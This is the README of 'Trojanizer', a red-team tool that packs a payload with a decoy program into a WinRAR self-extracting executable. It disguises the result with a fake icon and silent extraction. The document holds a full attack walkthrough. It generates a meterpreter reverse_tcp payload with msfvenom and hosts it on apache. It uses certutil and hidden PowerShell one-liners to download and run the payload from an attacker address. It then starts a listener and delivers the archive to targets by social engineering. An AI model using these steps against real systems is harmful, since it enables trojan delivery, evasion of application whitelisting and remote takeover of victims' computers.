[![Version](https://img.shields.io/badge/Trojanizer-v1.1-brightgreen.svg?maxAge=259200)]()
[![Stage](https://img.shields.io/badge/Release-Stable-brightgreen.svg)]()
[![Build](https://img.shields.io/badge/Supported_OS-Ubuntu,Kali,Mint,Parrot-blue.svg)]()
[![AUR](https://img.shields.io/aur/license/yaourt.svg)]()


## TROJANIZER
    Version release : v1.1 (Stable)
    Author : pedro ubuntu  [ r00t-3xp10it ]
    Codename: Troia_Revisited
    Distros Supported : Ubuntu, Kali, Mint, Parrot OS
    Suspicious-Shell-Activity (SSA) RedTeam develop @2017

![Trojanizer v1.1-Stable](http://i.cubeupload.com/xLyAG8.png)

<br />

## FRAMEWORK DESCRIPTION
    The Trojanizer tool uses WinRAR (SFX) to compress the two files input by user,
    and transforms it into an SFX executable(.exe) archive. The sfx archive when
    executed it will run both files (our payload and the legit appl at the same time).

    To make the archive less suspicious to target at execution time, trojanizer will
    try to replace the default icon(.ico) of the sfx file with a user-selected one,
    and supress all SFX archive sandbox msgs (Silent=1 | Overwrite=1).

   **'Trojanizer will not build trojans, but from target perspective, it replicates the trojan behavior'**<br />
   (execute the payload in background, while the legit application executes in foreground).

![Trojanizer v1.1-Stable](http://i.cubeupload.com/RBwTlq.png)<br />

<br /><br /><br />

## DEPENDENCIES (backend applications)
    Zenity (bash-GUIs) | Wine (x86|x64) | WinRAr.exe (installed-in-wine)
    "Trojanizer.sh will download/install all dependencies as they are needed"
    ╔────────────────────────────────────────────────────────────────────────────────────────────╗
    |        It is recomended to edit and config the option: SYSTEM_ARCH=[ your_sys_arch ]       |
    |        in the 'settings' file before attempting to run the tool for the first time.        |
    ╚────────────────────────────────────────────────────────────────────────────────────────────╝
![Trojanizer v1.1-Stable](http://i.cubeupload.com/nIV8rl.png)<br />

<br />

## PAYLOADS (agents) ACCEPTED
    .exe | .bat | .vbs | .ps1
    "All payloads that windows/SFX can auto-extract-execute"

    HINT: If sellected 'SINGLE_EXEC=ON' in the settings file,
    then trojanizer will accept any kind of extension to be inputed.

<br />

## LEGIT APPLICATIONS ACCEPTED (decoys)
    .exe | .bat | .vbs | .ps1 | .jpg | .bmp | .doc | .ppt | etc ..
    "All applications that windows/SFX can auto-extract-execute"

<br /><br /><br />

## ADVANCED SETTINGS
    ╔─────────────────────────────────────────────────────────────────────────────────────────╗
    |         Trojanizer 'advanced options' are only accessible in the 'settings' file,       |
    |       and they can only be configurated before running the main tool (Trojanizer.sh)    |
    ╚─────────────────────────────────────────────────────────────────────────────────────────╝

   **-- Presetup advanced option**<br />
   Trojanizer can be configurated to execute a program + command before the extraction/execution
   of the two compressed files (SFX archive). This allow users to take advantage of pre-installed
   software to execute a remote command before the actual extraction occurs in target system.
    **If active, trojanizer will asks (zenity sandbox) for the command to be executed**
![Trojanizer v1.1-Stable](http://i.cubeupload.com/8hDu1l.png)<br />


   **-- single_file_execution**<br />
   Lets look at the follow scenario: You have a dll payload to input that you need to execute
   upon extraction, but sfx archives can not execute directly dll files, This setting allow
   users to input one batch script(.bat) that its going to be used to execute the dll payload.
   All that Trojanizer needs to Do its to instruct the SFX archive to extract both files and
   them execute the script.bat
![Trojanizer v1.1-Stable](http://i.cubeupload.com/38sxgB.png)<br />

    ╔────────────────────────────────────────────────────────────────────────────────────────────────╗
    |  single_file_execution switch default behavior its to compress the two files inputed by user   |
    |  but only execute one of them at extraction time (the 2º file inputed will be executed) ..     |
    ╚────────────────────────────────────────────────────────────────────────────────────────────────╝

<br /><br />

## TROJANIZER AND APPL WHITELISTING BYPASSES
    ╔────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
    |   A lot of awesome work has been done by a lot of people, especially @subTee, regarding  application whitelisting  |
    |   bypass, which is eventually what we want here: execute arbitrary code abusing Microsoft built-in binaries.       |
    | https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/ |
    ╚────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╝

    The follow exercise describes how to use trojanizer 'single_file_execution' and 'Presetup' advanced switchs to
    drop (remote download) and execute any payload using 'certutil' or 'powershell' appl_whitelisting_bypass oneliners ..


    1º - use metasploit to build our payload
         msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -f exe -o payload.exe

    2º - copy payload.exe to apache2 webroot and start service
         cp payload.exe /var/www/html/payload.exe
         service apache2 start

    3º - edit Trojanizer 'settings' file and activate:
         PRE_SETUP=ON
         SINGLE_EXEC=ON

    4º - running trojanizer tool
         PAYLOAD TO BE COMPRESSED => <path-to>/screenshot.png (it will not matter what you compress)
         EXECUTE THIS FILE UPON EXTRACTION => <path-to>/AngryBirds.exe (to be executed as decoy application)
         PRESETUP SANDBOX => cmd.exe /c certutil -urlcache -split -f http://192.168.1.69/payload.exe %TEMP%\\payload.exe && start %TEMP%\\payload.exe
         SFX FILENAME => AngryBirds_installer (the name of the sfx archive to be created)
         REPLACE ICON => Windows-Store.ico OR Steam-logo.ico

    5º - start a listenner, and send the sfx archive to target using social enginnering
         msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.1.69; set lport 666; exploit'


    ╔────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
    |      When the sfx archive its executed, it will download payload.exe from our apache2 webserver to target and      |
    |    execute it before extract 'screenshot.png' and 'AngryBirds.exe' (last one will be executed to serve as decoy)   |
    ╚────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╝


    The follow oneliner uses 'powershell(Downloadfile+start)' method to achieve the same as previous 'certutil' exercise ..
    cmd.exe /c powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://192.168.1.69/payload.exe', '%TEMP%\\payload.exe') & start '%TEMP%\\payload.exe'

    The follow oneliner uses 'powershell(IEX+downloadstring)' method to achieve allmost the same (payload.ps1 does not touch disk)
    cmd.exe /c powershell.exe -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.69/payload.ps1'))"
    

<br /><br /><br />

## DOWNLOAD/INSTALL
    1º - Download framework from github
         git clone https://github.com/r00t-3xp10it/trojanizer.git

    2º - Set files execution permitions
         cd trojanizer
         sudo chmod +x *.sh

    3º - config framework
         nano settings

    4º - Run main tool
         sudo ./Trojanizer.sh

<br /><br /><br />

## Framework Screenshots
**xsf.conf - execute both files upon extraction (trojan behavior)**
![Trojanizer v1.1-Stable](http://i.cubeupload.com/QJ3D2L.png)<br />
**xsf.conf - single_file_execution + Presetup (advanced options)**
![Trojanizer v1.1-Stable](http://i.cubeupload.com/2wBpQf.png)<br />
**xsf.conf - single_file_execution + Presetup + appl_whitelisting_bypass (certutil)**
![Trojanizer v1.1-Stable](http://i.cubeupload.com/HxEh1J.png)<br />
**xsf.conf - single_file_execution + Presetup + appl_whitelisting_bypass (powershell IEX)**
![Trojanizer v1.1-Stable](http://i.cubeupload.com/dU1DoF.png)<br />
**Final sfx archive with icon changed**<br />
![Trojanizer v1.1-Stable](http://i.cubeupload.com/L1r4hg.png)<br />
**Inside the sfx archive (open with winrar) - trojan behavior**<br />
![Trojanizer v1.1-Stable](http://i.cubeupload.com/4xZdmZ.png)<br />
**Inside the sfx archive (open with winrar) - single_file_execution**<br />
![Trojanizer v1.1-Stable](http://i.cubeupload.com/IGNbwP.png)<br />


<br /><br /><br />

## Video tutorials
**Trojanizer - AVG anti-virus fake installer (trojan behavior)**<br />
https://www.youtube.com/watch?v=BIn6_ccZrI0<br />


**Trojanizer - single_file_execution (not trojan behavior)**<br />
https://www.youtube.com/watch?v=Ze0JkVtKbns<br />

<br /><br />

## Special thanks:
**@subTee** | **@enigma0x3** | **@H4d3s (SSA)**

Referencies:<br />
http://acritum.com/software/manuals/winrar/<br />
https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/<br />
https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/<br />


### Report bugs:
https://github.com/r00t-3xp10it/trojanizer/issues
## -- Suspicious-Shell-Activity© (SSA) RedTeam develop @2017 --

